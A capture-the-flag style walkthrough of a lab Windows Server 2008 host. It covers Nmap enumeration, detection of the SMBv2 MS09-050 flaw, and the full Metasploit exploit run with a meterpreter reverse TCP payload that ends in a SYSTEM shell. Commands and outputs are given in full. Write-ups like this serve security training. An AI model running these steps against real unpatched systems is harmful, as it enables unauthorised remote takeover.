#box #NSE #metasploit #MS09-050

Internal is a machine involving an initial SMB Vulnerability causing a RCE throughout injecting a shell payload with msfvenom and getting the payload within a listener on metasploit. The RCE grants us NT AUTHORITY rights on the target machine.
## Nmap

```bash
# Nmap 7.95 scan initiated Fri Jul 18 11:28:25 2025 as: /usr/lib/nmap/nmap -o scv --min-rate=10000 -sCV 192.168.231.40
Nmap scan report for 192.168.231.40
Host is up (0.033s latency).
Not shown: 987 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.0.6001 (17714650) (Windows Server 2008 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.0.6001 (17714650)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows Server (R) 2008 Standard 6001 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ms-wbt-server Microsoft Terminal Service
| ssl-cert: Subject: commonName=internal
| Not valid before: 2024-08-02T02:11:44
|_Not valid after:  2025-02-01T02:11:44
| rdp-ntlm-info: 
|   Target_Name: INTERNAL
|   NetBIOS_Domain_Name: INTERNAL
|   NetBIOS_Computer_Name: INTERNAL
|   DNS_Domain_Name: internal
|   DNS_Computer_Name: internal
|   Product_Version: 6.0.6001
|_  System_Time: 2025-07-18T15:29:24+00:00
|_ssl-date: 2025-07-18T15:29:33+00:00; -1s from scanner time.
5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49156/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  msrpc         Microsoft Windows RPC
49158/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: INTERNAL; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008::sp1, cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_server_2008:r2

Host script results:
| smb2-security-mode: 
|   2:0:2: 
|_    Message signing enabled but not required
|_clock-skew: mean: 1h23m58s, deviation: 3h07m49s, median: -1s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows Server (R) 2008 Standard 6001 Service Pack 1 (Windows Server (R) 2008 Standard 6.0)
|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
|   Computer name: internal
|   NetBIOS computer name: INTERNAL\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-07-18T08:29:24-07:00
| smb2-time: 
|   date: 2025-07-18T15:29:24
|_  start_date: 2024-08-03T02:11:43
|_nbstat: NetBIOS name: INTERNAL, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:9e:bf:89 (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jul 18 11:29:34 2025 -- 1 IP address (1 host up) scanned in 68.77 second
```

After trying various authentication, we weren't able to succeed with any, thus we opt for running a vulnerability scan with nmap, obtaining that SMB is vulnerable to [CVE-3009-3103](https://github.com/sec13b/ms09-050_CVE-2009-3103):

```bash
┌──(root㉿kali)-[~/Desktop/OSCP/Internal]
└─# nmap -p445 192.168.231.40 --script="smb-vuln*"
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-18 11:50 EDT
Nmap scan report for 192.168.231.40
Host is up (0.030s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: TIMEOUT
| smb-vuln-cve2009-3103: 
|   VULNERABLE:
|   SMBv2 exploit (CVE-2009-3103, Microsoft Security Advisory 975497)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2009-3103
|           Array index error in the SMBv2 protocol implementation in srv2.sys in Microsoft Windows Vista Gold, SP1, and SP2,
|           Windows Server 2008 Gold and SP2, and Windows 7 RC allows remote attackers to execute arbitrary code or cause a
|           denial of service (system crash) via an & (ampersand) character in a Process ID High header field in a NEGOTIATE
|           PROTOCOL REQUEST packet, which triggers an attempted dereference of an out-of-bounds memory location,
|           aka "SMBv2 Negotiation Vulnerability."
|           
|     Disclosure date: 2009-09-08
|     References:
|       http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103

Nmap done: 1 IP address (1 host up) scanned in 45.18 seconds
```

## Foothold

To gain the foothold, we must rely on Metasploit since using commonly the python script seems not to be working [consistently](https://forum.hackthebox.com/t/ms09-050-python-40280-py-vs-metasploit-ms09-050-smb2-negotiate-func-index/3598).

We then open Metasploit, and look for MS09-050 a.k.a. CVE-2009-3103:

```bash
msf6 > search cve-2009-3103

Matching Modules
================

   #  Name                                                       Disclosure Date  Rank    Check  Description
   -  ----                                                       ---------------  ----    -----  -----------
   0  exploit/windows/smb/ms09_050_smb2_negotiate_func_index     2009-09-07       good    No     MS09-050 Microsoft SRV2.SYS SMB Negotiate ProcessID Function Table Dereference
   1  auxiliary/dos/windows/smb/ms09_050_smb2_negotiate_pidhigh  .                normal  No     Microsoft SRV2.SYS SMB Negotiate ProcessID Function Table Dereference
   2  auxiliary/dos/windows/smb/ms09_050_smb2_session_logoff     .                normal  No     Microsoft SRV2.SYS SMB2 Logoff Remote Kernel NULL Pointer Dereference
```

We then select, the first option, the exploit with `use 0`.
Then, we check the options of the exploit and compile the exploit with the requirement information, we then execute it with the command `run`:

```bash
msf6 exploit(windows/smb/ms09_050_smb2_negotiate_func_index) > options

Module options (exploit/windows/smb/ms09_050_smb2_negotiate_func_index):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT   445              yes       The target port (TCP)
   WAIT    180              yes       The number of seconds to wait for the attack to complete.


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.200.132  yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows Vista SP1/SP2 and Server 2008 (x86)



View the full module info with the info, or info -d command.

msf6 exploit(windows/smb/ms09_050_smb2_negotiate_func_index) > set RHOSTS 192.168.231.40
RHOSTS => 192.168.231.40
msf6 exploit(windows/smb/ms09_050_smb2_negotiate_func_index) > set LHOST tun0
LHOST => 192.168.45.231
msf6 exploit(windows/smb/ms09_050_smb2_negotiate_func_index) > run
[*] Started reverse TCP handler on 192.168.45.231:4444 
[*] 192.168.231.40:445 - Connecting to the target (192.168.231.40:445)...
[*] 192.168.231.40:445 - Sending the exploit packet (951 bytes)...
[*] 192.168.231.40:445 - Waiting up to 180 seconds for exploit to trigger...
```

After some seconds, we'll receive the meterpreter shell. We then opt to convert it into a fully interactive shell and, with `whoami` we realize that we gained control of the machine as `NT AUTHORITY\SYSTEM`.

```bash
[*] Sending stage (177734 bytes) to 192.168.231.40
[*] Meterpreter session 1 opened (192.168.45.231:4444 -> 192.168.231.40:49159) at 2025-07-18 12:22:31 -0400

meterpreter > shell
Process 2116 created.
Channel 1 created.
Microsoft Windows [Version 6.0.6001]
Copyright (c) 2006 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```